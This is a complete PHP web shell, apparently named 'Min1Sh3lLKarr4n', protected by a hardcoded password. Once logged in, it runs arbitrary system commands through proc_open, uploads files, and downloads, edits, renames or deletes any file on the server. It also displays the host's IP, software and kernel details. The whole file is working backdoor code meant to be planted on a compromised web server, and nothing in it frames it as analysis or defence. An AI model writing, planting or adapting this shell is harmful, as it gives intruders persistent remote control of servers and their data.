<?php
session_start();
$pw = "karranx666";
$lokasi = isset($_GET['p']) ? $_GET['p'] : getcwd();
$lokasi = realpath($lokasi);

function cek($a){ return htmlspecialchars($a, ENT_QUOTES, 'UTF-8'); }

if (!isset($_SESSION['ok'])) {
    if (isset($_POST['key']) && $_POST['key'] === $pw) {
        $_SESSION['ok'] = true;
    } else {
        echo '<html><head><title></title><meta name="viewport" content="width=device-width, initial-scale=1"></head><body style="text-align:center;padding-top:20%;">
              <form method="post">
              <input type="password" name="key" placeholder="Password" style="padding:10px;width:200px;"><br><br>
              <input type="submit" value="Login" style="padding:10px 30px;">
              </form></body></html>';
        exit;
    }
}

if (isset($_GET['dl'])) {
    $f = $_GET['dl'];
    if (is_file($f)) {
        header('Content-Disposition: attachment; filename="'.basename($f).'"');
        readfile($f);
        exit;
    }
}

if (isset($_GET['rm'])) {
    $f = $_GET['rm'];
    if (is_file($f)) {
        unlink($f);
    } elseif (is_dir($f)) {
        rmdir($f);
    }
    header('Location: ?p='.urlencode(dirname($f)));
    exit;
}

if (isset($_POST['upl']) && isset($_FILES['file'])) {
    move_uploaded_file($_FILES['file']['tmp_name'], $lokasi.'/'.$_FILES['file']['name']);
}

if (isset($_POST['cmd'])) {
    $out = '';
    $descspec = array(
        0 => array("pipe", "r"),
        1 => array("pipe", "w"),
        2 => array("pipe", "w")
    );
    $p = proc_open($_POST['cmd'], $descspec, $pipes);
    if (is_resource($p)) {
        $out = stream_get_contents($pipes[1]);
        fclose($pipes[0]);
        fclose($pipes[1]);
        fclose($pipes[2]);
        proc_close($p);
    }
}

if (isset($_GET['edit'])) {
    $f = $_GET['edit'];
    if (isset($_POST['simpan'])) {
        file_put_contents($f, $_POST['konten']);
        header('Location: ?p='.urlencode(dirname($f)));
        exit;
    }
    echo '<form method="post">
          <textarea name="konten" style="width:100%;height:80vh;">'.cek(file_get_contents($f)).'</textarea><br>
          <input type="submit" name="simpan" value="Save" style="padding:10px 20px;">
          </form>';
    exit;
}

if (isset($_GET['ren'])) {
    $f = $_GET['ren'];
    if (isset($_POST['newname'])) {
        rename($f, dirname($f).'/'.$_POST['newname']);
        header('Location: ?p='.urlencode(dirname($f)));
        exit;
    }
    echo '<form method="post">
          <input type="text" name="newname" value="'.basename($f).'" style="width:300px;">
          <input type="submit" value="Rename">
          </form>';
    exit;
}

$fs = is_dir($lokasi) ? scandir($lokasi) : [];

?>
<html>
<head>
<title>Min1Sh3lLKarr4n</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body {background:#111;color:#eee;font-family:sans-serif;padding:10px;margin:0;}
a {color:#00eaff;text-decoration:none;font-weight:bold;}
a:hover {color:#00ffc3;}
table {width:100%;border-collapse:collapse;margin-top:10px;}
th,td {padding:8px;border:1px solid #333;}
input[type=text], input[type=password], textarea {background:#222;color:#eee;border:1px solid #555;padding:5px;}
input[type=submit] {background:#333;color:#eee;padding:8px 16px;border:none;margin-top:5px;cursor:pointer;}
input[type=submit]:hover {background:#555;}
.warning {color:red;font-weight:bold;}
@media (max-width:600px){td,th{font-size:12px;}}
</style>
</head>
<body>

<h2 style="text-align:center;">Min1Sh3lLKarr4n</h2>

<b>Server Info:</b><br>
IP: <?=cek($_SERVER['SERVER_ADDR'])?><br>
Software: <?=cek($_SERVER['SERVER_SOFTWARE'])?><br>
Kernel: <?=cek(php_uname())?><br>
<?php if (!is_dir($lokasi)): ?>
    <div class="warning">Invalid Path: <?=cek($lokasi)?></div>
<?php else: ?>
    Current Directory: <?=cek($lokasi)?><br>
<?php endif; ?>
<br>

<form method="POST" enctype="multipart/form-data">
<input type="file" name="file">
<input type="submit" name="upl" value="Upload">
</form>

<br>

<form method="POST">
<input type="text" name="cmd" placeholder="Execute command" style="width:80%;">
<input type="submit" value="Run">
</form>

<?php if (isset($out)) echo "<pre>$out</pre>"; ?>

<?php if (is_dir($lokasi)): ?>
<table>
<tr><th>Name</th><th>Type</th><th>Size</th><th>Actions</th></tr>
<?php
foreach ($fs as $f) {
    if ($f == '.') continue;
    $fp = $lokasi.'/'.$f;
    echo '<tr>';
    if (is_dir($fp)) {
        echo '<td><a href="?p='.urlencode($fp).'">['.cek($f).']</a></td><td>Dir</td><td>--</td><td>--</td>';
    } else {
        echo '<td>'.cek($f).'</td><td>File</td><td>'.filesize($fp).' B</td>
        <td>
        <a href="?dl='.urlencode($fp).'">Download</a> |
        <a href="?edit='.urlencode($fp).'">Edit</a> |
        <a href="?ren='.urlencode($fp).'">Rename</a> |
        <a href="?rm='.urlencode($fp).'" onclick="return confirm(\'Delete?\')">Delete</a>
        </td>';
    }
    echo '</tr>';
}
?>
</table>
<?php endif; ?>

</body>
</html>
